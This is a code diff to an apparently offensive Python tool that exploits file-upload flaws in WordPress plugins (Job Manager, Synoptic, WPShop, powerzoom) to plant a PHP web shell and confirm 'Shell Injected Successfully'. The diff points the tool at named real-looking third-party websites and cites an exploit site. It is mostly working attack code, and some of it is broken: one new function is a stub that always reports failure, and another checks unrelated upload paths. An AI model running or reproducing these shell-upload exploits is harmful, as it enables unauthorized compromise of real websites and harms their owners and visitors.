@@ -34,7 +34,10 @@ headers = {
             "Keep-Alive": "timeout=15"
 }
 
-url = "https://www.maplatine.com"
+url = "http://www.AmnPardaz.com/"
+
+#url = "http://www.curtiswrightoutfitters.com"
+#url = "https://www.maplatine.com"
 def banner():
     print("""%s
                    __     __     _      __  __
@@ -88,6 +91,8 @@ def contentw():
         wp_jobmanager()
         wp_showbiz()
         wp_synoptic()
+        wp_shop()
+        wp_injection()
     elif drupal:
         print ('%s[%i] %s %s Drupal \n\n' % (W,id,url,G))
     elif prestashop:
@@ -211,7 +216,7 @@ def wp_jobmanager():
         print ('%s [%s+%s] Job Manager Plugin%s -------- %s YES' %(W,G,W,W,G))
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
     else:
-        print ('%s [%s-%s] Job Manager Plugin%s ------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] Job Manager Plugin%s -------- %s NO' %(W,R,W,W,R))
 
 ################ Showbiz Plugin #####################
 
@@ -257,7 +262,7 @@ def wp_synoptic():
     options = {
             field:shell
     }
-    send_image = requests.post(endpoint,options,headers)
+    send_shell = requests.post(endpoint,options,headers)
     dump_data = url + "/wp-content/uploads/markets/avatars/VulnX.php?Vuln=X"
     response=requests.get(dump_data, headers)
     res  = response.text
@@ -268,6 +273,75 @@ def wp_synoptic():
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
     else:
         print ('%s [%s-%s] Synoptic Plugin%s ----------- %s NO' %(W,R,W,W,R))
+
+################ Wpshop Plugin #####################
+
+def wp_shop():
+    endpoint = url + "/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload"
+    shell = open('VulnX.php','rb')
+    field = "wpshop_file"
+    headers['Content_Type'] = 'multipart/form-data'
+    options = {
+            field:shell
+    }
+    send_shell = requests.post(endpoint,options,headers)
+    dump_data = url + "/wp-content/uploads/VulnX.php?Vuln=X"
+    response=requests.get(dump_data, headers)
+    res  = response.text
+    check_shop = re.findall("Vuln X", res)
+    if check_shop:
+        print ('%s [%s+%s] WPShop Plugin%s ------------- %s YES' %(W,G,W,W,G))
+        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+    else:
+        print ('%s [%s-%s] WPShop Plugin%s ------------- %s NO' %(W,R,W,W,R))
+
+################ Content Injection #####################
+
+def wp_injection():
+    endpoint = url + "index.php/wp-json/wp/v2/posts/"
+    check_shop = False
+    a="a"
+    if check_shop:
+        print ('%s [%s+%s] Injection Content%s ----------- %s YES' %(W,G,W,W,G))
+        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B,a ))
+    else:
+        print ('%s [%s-%s] Injection Content%s --------- %s NO' %(W,R,W,W,R))
+
+
+################ Sydney Theme ##########################
+#http://www.exploit4arab.org/exploits/2099?fbclid=IwAR0RMJ8yFtSPhTNr5Q75CmZuqSzD5nV_4kZWNKeWJfWmw0VAjefvTU92-Yg
+
+
+
+
+################ powerzoom Plugin #####################
+
+def wp_powerzoom():
+    endpoint = url + "/wp-admin/admin.php?page=powerzoomer_manage"
+    headers['Content_Type'] = 'multipart/form-data'
+    options = {
+               'album_img':[open('VulnX.php','rb')],
+               'task':'pwz_add_new_album',
+               'album_name':'',
+               'album_desc':''
+        }
+
+
+    send_shell = requests.post(endpoint,options,headers)
+    response  = send_shell.text
+    dump_data  = url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnX.php?Vuln=X"
+    check_fromcraft = re.findall("\/uploads\/powerzoomer\/(.*?)\/big\/XAttacker.php", response)
+    send_shell = requests.post(endpoint,options,headers)
+    check_shop = False
+    a="a"
+    if check_shop:
+        print ('%s [%s+%s] Injection Content%s ----------- %s YES' %(W,G,W,W,G))
+        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B,a ))
+    else:
+        print ('%s [%s-%s] Injection Content%s --------- %s NO' %(W,R,W,W,R))
+
+
+
 
 if __name__ == "__main__":
 
